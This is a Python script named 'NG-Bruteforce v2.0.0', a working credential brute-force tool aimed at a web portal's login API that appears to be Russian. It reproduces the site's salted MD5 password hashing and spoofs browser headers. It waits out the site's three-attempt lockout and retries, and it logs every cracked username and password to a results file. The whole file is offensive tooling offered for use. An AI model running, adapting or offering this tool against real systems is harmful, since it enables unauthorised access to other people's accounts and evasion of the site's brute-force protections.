import requests, os, time, sys, json
from hashlib import md5

title = " NG-Bruteforce v2.0.0"

def getauthdata(config):
    session = requests.Session()
    response = session.post("https://" + config["url"] + "/webapi/auth/getdata")
    if response.status_code==200:
        for c in response.cookies:
            if c.name=="NSSESSIONID":
                NSSESSIONID = c.value
        return [session, response.json().pop('salt'), response.json().pop('lt'), response.json().pop('ver'), NSSESSIONID]

def trytologin(session, username, password, config, NSSESSIONID, salt, lt, ver):
    login_headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "Accept-Language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding":"gzip, deflate,br",
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With":"XMLHttpRequest",
        "Origin":"https://" + config["url"],
        "Connection":"keep-alive",
        "Referer":"https://" + config["url"] + "/",
        "Cookie":"NSSESSIONID=" + NSSESSIONID,
        "Sec-Fetch-Dest":"empty",
        "Sec-Fetch-Mode":"cors",
        "Sec-Fetch-Site":"same-origin",
        "TE":"trailers",
    }
    encoded_password = md5(password.encode('windows-1251')).hexdigest().encode()
    pw2 = md5(salt.encode() + encoded_password).hexdigest()
    pw = pw2[:len(password)]
    raw_data = "LoginType=1&cid="+config["cid"]+"&sid="+config["sid"]+"&pid="+config["pid"]+"&cn="+config["cn"]+"&sft="+config["sft"]+"&scid="+config["scid"]+"&UN="+username+"&PW="+pw+"&lt="+lt+"&pw2="+pw2+"&ver="+ver
    response = session.post("https://" + config["url"] + "/webapi/login", data=raw_data.encode(), headers=login_headers)
    if "Неправильный" in str(response.json()):
        print("Wrong: " + password)
        return False
    else:
        return str(response.json())

def trytologout(config, session):
    logout_headers = {
        "Host":config["url"],
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        "Accept-Language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding":"gzip, defalte, br",
        "DNT":"1",
        "Cookie": str(session.cookies.get_dict()).replace("{", "").replace("}", "").replace("': '", "=").replace(",", ";").replace("'", ""),
        "Upgrade-Insecure-Requests":"1",
        "Sec-Fetch-Dest":"document",
        "Sec-Fetch-Mode":"navigate",
        "Sec-Fetch-Site":"none",
        "Sec-Fetch-User":"?1"
    }
    session.post("https://" + config["url"] + "/asp/logout.asp", headers=logout_headers)
    session.close()

def login_succ(username, password, logfile): 
    print("Success: " + password)
    open(logfile, "a").write("\n" + username + ":" + password)


def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system("clear")

print(title)
print()
print(" Make your own config from <url>/webapi/login")
config = json.loads(open(input("Config file: ")).read())
usernames = input("Usernames file: ")
passwords = input("Dictionary file: ")
logfile = input("Results file: ")
if logfile=="": logfile = "results.txt"

try:
    passwords = [value for value in open(passwords, "r").read().split("\n") if value]
    usernames = [value for value in open(usernames, "r", encoding="UTF-8").read().split("\n") if value]
except FileNotFoundError:
    sys.exit()

authdata = getauthdata(config)
for username in usernames:
    clear()
    print(title)
    print()
    print("Username: " + username)
    for password in passwords:
        login_response = trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
        if login_response==False: continue
        if "Вы совершили 3 неудачные попытки входа. Следующая попытка может быть совершена не ранее чем через минуту" in login_response:
            print("Requests limit. 1 minute sleep...")
            time.sleep(61)
            authdata = getauthdata(config)
            login_response = trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
            if login_response==False: continue
        if "Ошибка входа в систему.\nПожалуйста, обновите в браузере страницу входа в систему" in login_response:
            authdata = getauthdata(config) # make new session
            login_response = trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
            if login_response==False: continue
        trytologout(config, authdata[0])
        login_succ(username, password, logfile)
